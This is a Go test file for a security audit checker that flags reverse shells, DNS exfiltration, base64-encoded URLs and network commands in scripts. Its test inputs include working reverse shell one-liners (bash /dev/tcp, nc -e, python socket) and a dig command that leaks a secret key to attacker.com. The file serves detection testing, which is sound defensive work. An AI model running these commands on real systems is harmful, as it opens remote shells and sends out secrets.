// SPDX-License-Identifier: MPL-2.0

package audit

import (
	"testing"
)

func TestNetworkChecker_ReverseShell(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		script string
	}{
		{"bash_devtcp", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"},
		{"nc_reverse", "nc -e /bin/sh 10.0.0.1 4242"},
		{"python_socket", "python3 -c 'import socket; s=socket.socket(); s.connect((\"10.0.0.1\",4242))'"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			sc := newSingleScriptContext(tt.script)
			checker := NewNetworkChecker()
			findings, err := checker.Check(t.Context(), sc)
			if err != nil {
				t.Fatal(err)
			}

			hasCritical := false
			for _, f := range findings {
				if f.Severity == SeverityCritical && f.Title == "Reverse shell pattern detected" {
					hasCritical = true
				}
			}
			if !hasCritical {
				t.Errorf("expected Critical reverse shell finding for %q", tt.name)
			}
		})
	}
}

func TestNetworkChecker_DNSExfiltration(t *testing.T) {
	t.Parallel()

	sc := newSingleScriptContext("dig $(echo $SECRET_KEY).attacker.com")
	checker := NewNetworkChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}

	hasDNS := false
	for _, f := range findings {
		if f.Title == "Possible DNS exfiltration pattern" {
			hasDNS = true
		}
	}
	if !hasDNS {
		t.Error("expected DNS exfiltration finding")
	}
}

func TestNetworkChecker_EncodedURL(t *testing.T) {
	t.Parallel()

	// "aHR0c" is the base64 prefix of "http"
	sc := newSingleScriptContext("echo aHR0cHM6Ly9leGFtcGxlLmNvbQ== | base64 -d")
	checker := NewNetworkChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}

	hasEncoded := false
	for _, f := range findings {
		if f.Title == "Script contains encoded URL" {
			hasEncoded = true
		}
	}
	if !hasEncoded {
		t.Error("expected encoded URL finding")
	}
}

func TestNetworkChecker_NetworkCommand(t *testing.T) {
	t.Parallel()

	sc := newSingleScriptContext("wget https://example.com/data.json -O output.json")
	checker := NewNetworkChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}

	hasNetwork := false
	for _, f := range findings {
		if f.Title == "Script uses network access command" {
			hasNetwork = true
		}
	}
	if !hasNetwork {
		t.Error("expected network command finding")
	}
}

func TestNetworkChecker_Clean(t *testing.T) {
	t.Parallel()

	sc := newSingleScriptContext("echo hello && ls -la")
	checker := NewNetworkChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Errorf("clean script produced %d findings, want 0", len(findings))
	}
}
